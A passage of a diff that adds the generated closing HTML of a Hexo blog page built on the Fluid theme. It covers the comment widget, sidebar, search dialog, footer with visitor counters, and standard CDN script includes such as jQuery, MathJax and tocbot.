+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'zKurisu/comments-utterances');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Jie</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Orkarin</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
